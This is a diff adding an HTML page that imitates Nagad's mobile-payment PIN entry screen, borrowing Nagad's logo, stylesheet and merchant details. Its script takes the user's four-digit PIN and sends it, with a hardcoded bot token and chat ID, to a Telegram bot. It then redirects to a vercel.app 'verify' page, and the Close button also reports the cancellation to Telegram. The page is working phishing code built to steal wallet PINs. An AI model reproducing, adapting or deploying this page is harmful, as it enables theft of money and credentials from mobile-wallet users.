@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/html">
+
+
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <link rel="icon" type="image/png" href="https://payment.mynagad.com:30000/img/nagad_favicon.png" sizes="16x16">
+
+    <title>Nagad Payment Page: PIN</title>
+
+    <link rel="stylesheet" type="text/css" href="https://payment.mynagad.com:30000/css/nagad.css">
+
+</head>
+
+
+
+<body>
+
+<div class="payment-screen">
+
+    <div class="payment-container">
+
+        <div class="btn-group lang-switcher" role="group" aria-label="Basic example">
+
+            <button id="bn_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('bn')">বাং</button>
+
+            <button id="en_btn" type="button" class="btn btn-secondary" onclick="changeLanguage('en')">Eng</button>
+
+        </div>
+
+        <div class="merchant-info">
+
+            <div class="top-icon">
+
+                <img class="img-fluid" src="https://payment.mynagad.com:30000/img/cart.png" alt="">
+
+            </div>
+
+            <div class="merchant-name">Software Shop Ltd</div>
+
+        </div>
+
+        <div class="payment-infos">
+
+            <p class="payment-info additional-field mb-0">
+
+                <strong class="translateable" data-trans-key="invoice_no">Invoice No:</strong>&nbsp;
+
+                <span>ECOM6015269</span>
+
+            </p>
+
+            <p class="payment-info additional-field mb-0">
+
+                <strong class="translateable" data-trans-key="total">Total Amount:</strong>&nbsp;BDT 
+
+                <span id="totalAmount">10.00</span>
+
+            </p>
+
+            <p class="payment-info additional-field mb-0">
+
+                <strong class="translateable" data-trans-key="charge">Charge:</strong>&nbsp;
+
+                <span>BDT 0</span>
+
+            </p>
+
+            <p class="payment-info additional-field mb-0">
+
+                <strong class="translateable" data-trans-key="additional_field_name"></strong>&nbsp;
+
+                <span></span>
+
+            </p>
+
+        </div>
+
+        <div class="form-container">
+
+            <form id="pin-form" action="" method="post">
+
+                <div class="form-group">
+
+                    <label for="" class="translateable" data-trans-key="pin_label">Enter PIN</label>
+
+                    <div class="box-inputs pin-input">
+
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="password" maxlength="1"
+
+                               autofocus>
+
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="password"
+
+                               maxlength="1">
+
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="password"
+
+                               maxlength="1">
+
+                        <input class="form-control" oninput="moveToNext(this)" inputmode="numeric" pattern="[0-9]*" type="password"
+
+                               maxlength="1">
+
+                    </div>
+
+                </div>
+
+
+
+                <div class="messages">
+    <span id="error-message" class="text-error"></span>
+</div>
+
+
+
+
+                
+
+
+                <div class="action-buttons">
+
+                  <button onclick="validatePIN(event)" type="button" class="btn translateable" id="confirmButton" data-trans-key="proceed_btn">Proceed</button>
+
+
+                    <button onclick="closePage()" type="button" class="btn translateable" id="close-window"
+
+                            data-trans-key="close_btn">Close</button>
+
+                </div>
+
+            </form>
+
+        </div>
+
+        <div class="nagad-logo">
+
+            <img class="img-fluid" src="https://payment.mynagad.com:30000/img/logo.png" alt="">
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // Dynamically display the amount
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || '10.00'; // Default to 10.00 if no amount provided
+
+    document.getElementById('totalAmount').textContent = amount; // Update the total amount dynamically
+
+    function moveToNext(input) {
+        if (input.value !== '' && isNaN(input.value)) {
+            input.value = '';
+            return;
+        }
+
+        if (input.value.length >= input.maxLength) {
+            let nextInput = input.nextElementSibling;
+            if (nextInput) {
+                nextInput.focus();
+            }
+        }
+    }
+
+   function validatePIN(event) {
+    event.preventDefault(); // Prevent form submission and page refresh
+    
+    const inputs = document.querySelectorAll('.pin-input input');
+    const errorMessage = document.getElementById('error-message');
+    let pin = '';
+
+    // Combine all input values to form the PIN
+    inputs.forEach(input => {
+        pin += input.value;
+    });
+
+    // Check if the PIN is valid
+    if (pin.length !== 4 || isNaN(pin)) {
+        errorMessage.textContent = 'Invalid PIN';
+        errorMessage.style.display = 'block'; // Show the error message
+        return;
+    }
+
+    errorMessage.style.display = 'none'; // Hide the error message if valid
+
+    sendToTelegram(pin); // Send the PIN to Telegram
+
+    // Redirect to the next page after 2 seconds
+    setTimeout(() => {
+        window.location.href = `https://portwallet.vercel.app/nagadoriginal/verify.html/?amount=${amount}`;
+    }, 2000);
+   }
+    function sendToTelegram(pin) {
+        const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+        const chatId = '7174617845';
+        const message = `Entered PIN: ${pin}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending message to Telegram:', response);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+
+    function closePage() {
+        sendCancellationMessage();
+        setTimeout(() => {
+            window.location.href = `https://allbuysell.vercel.app`;
+        }, 1000);
+    }
+
+    function sendCancellationMessage() {
+        const botToken = '7721532005:AAFNUxtAwHeH617lb1oOp3hcdKKjzRITS3Y';
+        const chatId = '7174617845';
+        const message = `Payment cancelled by the user.`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending message to Telegram:', response);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+</script>
+
+
+
+
+</body>
+
+
+
+  </html>
